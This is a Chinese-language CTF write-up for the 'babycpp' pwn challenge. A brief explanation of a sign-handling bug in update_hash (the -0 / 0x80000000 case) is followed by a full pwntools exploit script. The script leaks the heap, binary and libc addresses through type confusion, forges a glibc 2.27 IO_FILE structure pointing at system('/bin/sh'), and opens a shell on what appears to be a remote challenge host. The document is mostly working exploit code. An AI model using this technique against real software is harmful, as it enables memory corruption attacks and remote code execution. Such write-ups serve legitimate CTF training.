# 漏洞
程序的漏洞在 update_hash 里面，问题在于对于 -0 的情况没有考虑，也就是 0x80000000，所以这个时候就会有一个前向溢出。
通过修改虚表的位置，不断变化打印类型内容。
比如：
string -> int，泄露地址
int -> string，string[0] = "payload"，任意地址写
最后修改虚表，one_gadget 一直不成功，选择了伪造 IO_FILE，注意 2.27 的 IO_FILE 需要用到 _IO_str_jumps
# payload
```
from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./babycpp")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./babycpp")
else:
    p = remote("117.78.39.172","31029")
    libc = ELF("./libc-2.27.so")
    elf = ELF("./babycpp")

code_base = 0x555555554000
def debugf():
    if debug:
        #gdb.attach(p,"b *{b1}\nb *{b2}".format(b1 = hex(code_base + 0x139c),b2 = hex(code_base + 0xcdd)))
        gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x139c)))

def menu(choice):
    p.sendlineafter("Your choice:",str(choice))

def add(obj_type):
    menu(0)
    p.sendlineafter("Your choice:",str(obj_type))

def show(hash_info,index):
    menu(1)
    p.sendafter("Input array hash:",hash_info)
    p.sendlineafter("Input idx:",str(index))

def set(hash_info,index,value):
    menu(2)
    p.sendafter("Input array hash:",hash_info)
    p.sendlineafter("Input idx:",str(index))
    p.sendlineafter("Input val:",str(hex(value)[2:]))

def set_string(hash_info,index,length,value,new = True):
    menu(2)
    p.sendafter("Input array hash:",hash_info)
    p.sendlineafter("Input idx:",str(index))
    if new:
        p.sendlineafter("Input the len of the obj:",str(length))
        p.sendafter("Input your content:",value)
    else:
        p.sendafter("Input your content:",value)

def update(hash_info,index,new_hash):
    menu(3)
    p.sendafter("Input array hash:",hash_info)
    p.sendlineafter("Input idx:",str(index))
    p.sendafter("Input hash:",new_hash)

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
add(1) #0
add(0) #1
set_string(p64(1),0,0x100,"a"*0x100)
update(p64(1),0x80000000,"\xe0\x5c")
show(p64(1),0)
p.recvuntil("The value in the array is ")
leak_addr = int(p.recvuntil("\n",drop = True),16)
heap_base = leak_addr- 0x11ff0
log.success("heap_base:" + hex(heap_base))
target = heap_base + 0x11e70
target2 = heap_base + 0x11f60
set(p64(1),0,target)
set(p64(1),1,0x100)
set(p64(1),2,target2)
update(p64(1),0x80000000,"\x00\x5d")
show(p64(1),2)
p.recvuntil("Content:")
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
code_base = leak_addr - 0x201ce0
log.success("code_base:" + hex(code_base))
elf.address = code_base
target = elf.got["puts"]
update(p64(1),0x80000000,"\xe0\x5c")
set(p64(1),0,target)
update(p64(1),0x80000000,"\x00\x5d")
show(p64(1),2)
p.recvuntil("Content:")
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["puts"]
log.success("libc_base:" + hex(libc.address))
debugf()
target = libc.symbols["_IO_list_all"]
update(p64(1),0x80000000,"\xe0\x5c")
set(p64(1),0,target)
update(p64(1),0x80000000,"\x00\x5d")
target2 = heap_base + 0x12500
payload = p64(target2)
set_string(p64(1),2,0x100,payload,False)
target = target2
update(p64(1),0x80000000,"\xe0\x5c")
set(p64(1),0,target)
update(p64(1),0x80000000,"\x00\x5d")
target = libc.address + 0x3e8360 - 8
payload = "\x30;/bin/sh"
payload = payload.ljust(0x28,"\x00")
payload += p64(1)
payload = payload.ljust(0x38,"\x00")
payload += p64(heap_base + 0x12500 + 2)
payload = payload.ljust(0xd8,"\x00")
payload += p64(target)
payload = payload.ljust(0xe8,"\x00")
payload += p64(libc.symbols["system"])
set_string(p64(1),2,0x100,payload,False)
"""
target = libc.symbols["__malloc_hook"]
update(p64(1),0x80000000,"\xe0\x5c")
set(p64(1),0,target)
update(p64(1),0x80000000,"\x00\x5d")
one_gadget = libc.address + 0x10a38c
payload = p64(one_gadget)
set_string(p64(1),2,0x100,payload,False)
target = heap_base + 0x11f28
update(p64(1),0x80000000,"\xe0\x5c")
set(p64(1),0,target)
update(p64(1),0x80000000,"\x00\x5d")
payload = p64(0x501)
set_string(p64(1),2,0x100,payload,False)
#set_string(p64(1),3,0x100,"a"*0x100)
debugf()
update(p64(1),0x80000000,"\xe0\x5c")
set(p64(1),4,libc.symbols["free"])
target = heap_base + 0x11f80
update(p64(1),0x80000000,p64(target))
menu(1)
p.sendafter("Input array hash:",p64(1))
"""
menu(4)
p.interactive()
```